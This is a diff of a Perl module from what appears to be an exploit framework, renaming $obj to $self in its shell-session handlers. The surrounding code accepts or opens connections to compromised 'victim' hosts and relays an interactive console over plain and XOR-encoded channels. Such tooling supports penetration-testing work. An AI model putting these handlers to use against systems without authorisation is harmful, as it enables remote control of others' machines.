@@ -24,7 +24,7 @@ use strict;
 
 sub ConsoleStart
 {
-    my $obj = shift;
+    my $self = shift;
     
     my $con;
     my $stdpipe = 0;
@@ -43,29 +43,29 @@ sub ConsoleStart
                 while(sysread(STDIN, $input, 1)){ syswrite($wri, $input, length($input)); }
                 exit(0);
 	    }
-        $obj->{"CONSOLE"} = {"FD" => [$con, $wri], "PID" => $stdpipe};
+        $self->{"CONSOLE"} = {"FD" => [$con, $wri], "PID" => $stdpipe};
     } else {
         $con = *STDIN;
-        $obj->{"CONSOLE"} = {"FD" => [$con]};
+        $self->{"CONSOLE"} = {"FD" => [$con]};
     }
     return $con;
 }
 
 sub ConsoleStop
 {
-    my $obj = shift;
+    my $self = shift;
     
     # shutdown the win32 console pump
     if ($^O eq "MSWin32")
     {
-        foreach my $fd (@{$obj->{"CONSOLE"}->{"FD"}}) { $fd->close(); }
-        kill(9, $obj->{"CONSOLE"}->{"PID"}) if defined($obj->{"CONSOLE"}->{"PID"});
+        foreach my $fd (@{$self->{"CONSOLE"}->{"FD"}}) { $fd->close(); }
+        kill(9, $self->{"CONSOLE"}->{"PID"}) if defined($self->{"CONSOLE"}->{"PID"});
     }
 }
 
 sub reverse_shell
 {
-    my ($obj, $pay, $opt, $exploit) = @_;
+    my ($self, $pay, $opt, $exploit) = @_;
     
     my $s = IO::Socket::INET->new (
                 Proto => "tcp",
@@ -77,7 +77,7 @@ sub reverse_shell
 
     if (! $s)
     {
-        $obj->set_error("could not start listener: $!");
+        $self->set_error("could not start listener: $!");
         return undef;
     }
 
@@ -109,13 +109,13 @@ sub reverse_shell
 
             print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
 
-            my $console = $obj->ConsoleStart();
+            my $console = $self->ConsoleStart();
             my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
             $callback->("CONNECT", $victim);
 
-            $obj->DataPump($console, $victim, $callback);
+            $self->DataPump($console, $victim, $callback);
 
-            $obj->ConsoleStop($console);
+            $self->ConsoleStop($console);
             $callback->("DISCONNECT", $victim);
             $victim->close();
             undef($victim);
@@ -143,7 +143,7 @@ sub reverse_shell
 
 sub bind_shell
 {
-    my ($obj, $pay, $opt, $exploit) = @_;
+    my ($self, $pay, $opt, $exploit) = @_;
     my $stopconnect = 0;
     my $victim;
 
@@ -176,11 +176,11 @@ sub bind_shell
 
                     print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
 
-                    my $console = $obj->ConsoleStart();
+                    my $console = $self->ConsoleStart();
                     my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
                     $callback->("CONNECT", $victim);
-                    $obj->DataPump($console, $victim, $callback);
-                    $obj->ConsoleStop($console);
+                    $self->DataPump($console, $victim, $callback);
+                    $self->ConsoleStop($console);
                     $callback->("DISCONNECT", $victim);
                 } else {
                     select(undef, undef, undef, 0.5);
@@ -208,7 +208,7 @@ sub bind_shell
 
 sub impurity_reverse
 {
-    my ($obj, $pay, $opt, $exploit) = @_;
+    my ($self, $pay, $opt, $exploit) = @_;
 
     my $s = IO::Socket::INET->new (
                 Proto => "tcp",
@@ -220,7 +220,7 @@ sub impurity_reverse
 
     if (! $s)
     {
-        $obj->set_error("could not start listener: $!");
+        $self->set_error("could not start listener: $!");
         return undef;
     }
 
@@ -281,11 +281,11 @@ sub impurity_reverse
             print STDERR " Done\n";
             print STDERR "[*] Switching to impurity payload\n\n";
 
-            my $console = $obj->ConsoleStart();
+            my $console = $self->ConsoleStart();
             my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
             $callback->("CONNECT", $victim);
-            $obj->DataPump($console, $victim, $callback);
-            $obj->ConsoleStop($console);
+            $self->DataPump($console, $victim, $callback);
+            $self->ConsoleStop($console);
             $callback->("DISCONNECT", $victim);
         }
         # work around a massive array of win32 signaling bugs
@@ -306,7 +306,7 @@ sub impurity_reverse
 
 sub findsock_shell
 {
-    my ($obj, $pay, $opt, $exploit) = @_;
+    my ($self, $pay, $opt, $exploit) = @_;
     my $s = $opt->{'HCSOCK'};
     Pex::Unblock($s);
 
@@ -340,11 +340,11 @@ sub findsock_shell
             print $s "THANKS\n";
             
             # attach the exploit to the console
-            my $console = $obj->ConsoleStart();
+            my $console = $self->ConsoleStart();
             my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
             $callback->("CONNECT", $s);
-            $obj->DataPump($console, $s, $callback);
-            $obj->ConsoleStop($console);
+            $self->DataPump($console, $s, $callback);
+            $self->ConsoleStop($console);
             $callback->("DISCONNECT", $s);
         }
         # work around a massive array of win32 signaling bugs
@@ -362,7 +362,7 @@ sub findsock_shell
 
 sub findsock_shell_exp
 {
-    my ($obj, $opt, $e) = @_;
+    my ($self, $opt, $e) = @_;
     
     # this is our socket to the parent
     my $s = $opt->{'HPSOCK'};
@@ -385,14 +385,14 @@ sub findsock_shell_exp
         $r = <$s>;
         while (! defined($r)) { $r = <$s>; select(undef, undef, undef, 0.1) }
         
-        $obj->DataPump($s, $x, sub { });
+        $self->DataPump($s, $x, sub { });
         exit(0);
     }
 }
 
 sub reverse_shell_xor
 {
-    my ($obj, $pay, $opt, $exploit) = @_;
+    my ($self, $pay, $opt, $exploit) = @_;
     
     my $s = IO::Socket::INET->new (
                 Proto => "tcp",
@@ -404,7 +404,7 @@ sub reverse_shell_xor
 
     if (! $s)
     {
-        $obj->set_error("could not start listener: $!");
+        $self->set_error("could not start listener: $!");
         return undef;
     }
 
@@ -437,13 +437,13 @@ sub reverse_shell_xor
 
             print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
 
-            my $console = $obj->ConsoleStart();
+            my $console = $self->ConsoleStart();
             my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
             $callback->("CONNECT", $victim);
 
-            $obj->DataPumpXor($console, $victim, $callback, $xor_key);
+            $self->DataPumpXor($console, $victim, $callback, $xor_key);
 
-            $obj->ConsoleStop($console);
+            $self->ConsoleStop($console);
             $callback->("DISCONNECT", $victim);
             $victim->close();
             undef($victim);
@@ -470,7 +470,7 @@ sub reverse_shell_xor
 }
 
 sub unhandled {
-    my ($obj, $pay, $opt, $exploit) = @_;
+    my ($self, $pay, $opt, $exploit) = @_;
     my $stopserver = 0;
     my %OSIG;
     $OSIG{"TERM"} = $SIG{"TERM"};
